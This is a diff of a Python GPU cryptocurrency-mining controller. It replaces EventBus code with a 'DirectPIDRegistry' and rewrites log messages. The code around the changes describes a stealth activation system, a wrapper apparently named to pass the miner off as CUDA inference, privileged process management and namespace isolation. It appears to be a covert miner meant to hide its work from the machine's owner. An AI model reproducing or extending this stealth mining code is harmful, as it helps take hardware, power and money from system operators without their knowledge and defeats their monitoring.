@@ -164,11 +164,11 @@ def start_resource_manager():
             config = ConfigModel(**config_data)
             logger.info("✅ Configuration loaded successfully")
             
-            # **Step 2**: Initialize EventBus với **memory backend** (bộ xử lý bộ nhớ)
+            # **Step 2**: Initialize stealth activation system (EventBus replaced with DirectPIDRegistry)
             logger.info("📋 Step 2/5: Initializing stealth activation system...")
-            # Note: EventBus removed - system no longer uses event bus
+            # Note: EventBus completely removed - using DirectPIDRegistry for process communication
             
-            # **Step 2.5**: Initialize Stealth Activation Manager với **EventBus integration** (tích hợp EventBus)
+            # **Step 2.5**: Initialize Stealth Activation Manager (no EventBus needed)
             logger.info("📋 Step 2.5/5: Initializing Stealth Activation Manager...")
             stealth_init_success = initialize_stealth_activation(None)  # No event bus needed
             if stealth_init_success:
@@ -759,42 +759,20 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
                 
                 logger.info(f"PROCESS_START: {process_name} | PID={process.pid} | TYPE={miner_type} | TIME={startup_time}")
                 
-                # **EventBus publish** (xuất bản sự kiện) - **PID Propagation Flow Step 1**
+                # 🗑️ **REMOVED**: EventBus publishing replaced by DirectPIDRegistry
+                # Process registration now handled by stealth_inference_cuda.py via DirectPIDRegistry
                 try:
-                    from datetime import datetime
-                    
-                    # 🆕 Determine correct PID to propagate: prefer real mining PID if detected
+                    # 🆕 Determine correct PID for logging: prefer real mining PID if detected
                     event_pid = real_mining_pid if 'real_mining_pid' in locals() and real_mining_pid else process.pid
                     
-                    payload = {
-                        'pid': event_pid,
-                        'role': 'real',  # Always 'real' since we only propagate real mining PID
-                        'miner_type': miner_type,
-                        'timestamp': time.time(),
-                        'event_type': 'mining_started',
-                        'data': {
-                            'process_name': process_name,
-                            'command': ' '.join(mining_command),
-                            'stealth_mode': enable_stealth,  # GPU-only mode
-                            'namespace_isolation': enable_ns and privileged_manager is not None
-                        }
-                    }
-                    
-                    # **Publish** (xuất bản) to channel với retry logic
-                    # ✅ PHASE 2 REFACTORING: Chuẩn hóa Event Naming Conventions
-                    # Dual publishing approach để đảm bảo backward compatibility
-                    
-                    # Legacy format removed - EventBus no longer used
-                    logger.info(f"ℹ️  Mining started for {miner_type} (PID {event_pid}) - EventBus disabled")
-                    
-                    # New standardized format: domain:action pattern
-                    new_event_name = f'mining:{miner_type}_started'
-                    # EventBus publishing removed - system no longer uses event bus
-                    logger.info(f"✅ Mining started for {miner_type} (PID {event_pid}) - new format: {new_event_name}")
+                    logger.info(f"✅ Mining process started successfully:")
+                    logger.info(f"   ├─ Type: {miner_type}")
+                    logger.info(f"   ├─ PID: {event_pid}")
+                    logger.info(f"   ├─ Name: {process_name}")
+                    logger.info(f"   └─ Registration: Handled by DirectPIDRegistry in stealth wrapper")
                     
                 except Exception as e:
-                    logger.error(f"❌ Failed to publish mining_started event: {e}")
-                    # **Không dừng tiến trình** nếu EventBus thất bại - **fallback** vẫn hoạt động
+                    logger.error(f"❌ Failed to log mining process information: {e}")
                 
 
                 # ✅ ENHANCED: Ensure log file creation với initial logging
@@ -926,7 +904,7 @@ def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
     gpu_miner_logger.info("===== GPU MINER LIFECYCLE ENDED =====")
 
 def gpu_mining_thread():
-    """**Thread 3: GPU Mining** (Luồng 3: Khai thác GPU) với **Progressive GPU Activation** (kích hoạt GPU tuần tự) và **EventBus integration** (tích hợp EventBus)"""
+    """**Thread 3: GPU Mining** (Luồng 3: Khai thác GPU) với **Progressive GPU Activation** (kích hoạt GPU tuần tự) và **DirectPIDRegistry integration** (tích hợp DirectPIDRegistry)"""
     global gpu_process
     # 🔧 FIX: Sử dụng gpu_miner_logger thay vì tạo thread_logger riêng
     thread_logger = gpu_miner_logger
@@ -947,7 +925,7 @@ def gpu_mining_thread():
     activation_delay = min(5 * gpu_count, 30)  # Max 30s delay
     thread_logger.info(f"🕰️ [PROGRESSIVE-GPU] Using {activation_delay}s staged activation delay")
     
-    # EventBus removed - system no longer uses event bus
+    # 🗑️ EventBus completely removed - using DirectPIDRegistry for process communication
     max_retries = 5
     retries = 0
     
@@ -1009,7 +987,7 @@ def gpu_mining_thread():
                     thread_logger.error(f"❌ GPU mining startup failed (attempt {retries}/{max_retries})")
             else:
                 # **Process running - periodic PID update** (tiến trình đang chạy - cập nhật PID định kỳ)
-                # bỏ heartbeat qua EventBus – chỉ ghi log nội bộ
+                # DirectPIDRegistry handles all process communication - no EventBus needed
                 thread_logger.debug("GPU miner healthy heartbeat")
                 
         except Exception as e:
@@ -1046,8 +1024,7 @@ def resource_manager_thread():
         resource_manager = ResourceManager(config, None, thread_logger)  # No event bus needed
         thread_logger.info("✅ ResourceManager instance created")
         
-        # **EventBus notification** (thông báo EventBus) - Resource Manager ready
-        # Đã bỏ publish EventBus cho ResourceManager
+        # 🗑️ EventBus removed - ResourceManager uses DirectPIDRegistry observers
         
         # **Step 3**: Start ResourceManager
         thread_logger.info("🚀 Starting ResourceManager...")
@@ -1076,11 +1053,11 @@ def environment_setup_thread():
         return None
 
 def main():
-    """**Multi-Threading Architecture Main Function** (hàm chính kiến trúc đa luồng) với **EventBus coordination** (phối hợp EventBus)"""
+    """**Multi-Threading Architecture Main Function** (hàm chính kiến trúc đa luồng) với **DirectPIDRegistry coordination** (phối hợp DirectPIDRegistry)"""
     logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử (Multi-Threading Architecture) =====")
     
     # ------------------------------------------------------------------
-    # 1️⃣ Thiết lập môi trường đồng bộ (loại bỏ EventBus giữa các luồng)
+    # 1️⃣ Thiết lập môi trường đồng bộ (DirectPIDRegistry replaces EventBus)
     # ------------------------------------------------------------------
     global privileged_manager_global
     try:
@@ -1100,7 +1077,7 @@ def main():
         return  # Abort startup nếu môi trường lỗi
 
     # ------------------------------------------------------------------
-    # 2️⃣ Khởi tạo EventBus cho giao tiếp PID / ResourceManager
+    # 2️⃣ Khởi tạo DirectPIDRegistry cho giao tiếp PID / ResourceManager
     # ------------------------------------------------------------------
     # 🚀 Khởi động PID Logger worker với error handling và verification
     try:
@@ -1243,11 +1220,11 @@ def main():
         else:
             logger.info(f"⏸️ {thread_type} Thread disabled by configuration")
     
-    # **Thread Health Verification** (Xác minh sức khỏe luồng) với **EventBus monitoring** (giám sát EventBus)
+    # **Thread Health Verification** (Xác minh sức khỏe luồng) với **DirectPIDRegistry monitoring** (giám sát DirectPIDRegistry)
     logger.info("🔍 Verifying threads health...")
     time.sleep(5)  # Cho phép threads khởi tạo hoàn tất
     
-    # **GPU-Only EventBus Handlers** (xử lý sự kiện GPU duy nhất)
+    # **GPU-Only DirectPIDRegistry Status** (trạng thái DirectPIDRegistry GPU duy nhất)
     thread_status = {
         'gpu_pid_registered': False
     }
@@ -1264,7 +1241,7 @@ def main():
     
     # Performance monitoring removed - simplified thread management
     
-    # **Thread monitoring loop** (vòng lặp giám sát luồng) với **EventBus coordination** (phối hợp EventBus)
+    # **Thread monitoring loop** (vòng lặp giám sát luồng) với **DirectPIDRegistry coordination** (phối hợp DirectPIDRegistry)
     try:
         monitoring_interval = 30  # seconds
         while not stop_event.is_set():
@@ -1273,8 +1250,8 @@ def main():
                 if not thread.is_alive():
                     logger.warning(f"⚠️ {thread_name} thread has stopped")
                     
-                    # **EventBus notification** (thông báo EventBus) thread failure - removed
-                    logger.info(f"⚠️ {thread_name} thread has stopped - EventBus disabled")
+                    # 🗑️ **REMOVED**: EventBus notifications replaced by DirectPIDRegistry
+                    logger.info(f"⚠️ {thread_name} thread has stopped - using DirectPIDRegistry for notifications")
             
             # **Simple GPU process health check** (kiểm tra sức khỏe tiến trình GPU đơn giản)
             with process_lock:
@@ -1284,7 +1261,7 @@ def main():
                 logger.warning("⚠️ GPU mining process stopped!")
                 print(f"\033[91m⚠️ GPU MINING PROCESS STOPPED!\033[0m", flush=True)
             
-            # **System health check** (kiểm tra sức khỏe hệ thống) - EventBus removed
+            # **System health check** (kiểm tra sức khỏe hệ thống) - using DirectPIDRegistry
             logger.info(f"🔍 System health: {sum(1 for _, thread in started_threads if thread.is_alive())}/{len(started_threads)} threads alive, GPU alive: {gpu_alive}")
             
             time.sleep(monitoring_interval)
@@ -1296,7 +1273,7 @@ def main():
     # **Thread cleanup and synchronization** (dọn dẹp và đồng bộ hóa luồng)
     logger.info("🧹 Starting thread cleanup and synchronization...")
     
-    # **EventBus shutdown notification** (thông báo tắt EventBus) - removed
+    # 🗑️ **REMOVED**: EventBus shutdown - DirectPIDRegistry handles cleanup automatically
     logger.info(f"🔚 System shutdown initiated: {sum(1 for _, thread in started_threads if thread.is_alive())} active threads")
     
     # **Graceful thread termination** (kết thúc luồng nhẹ nhàng) với timeout
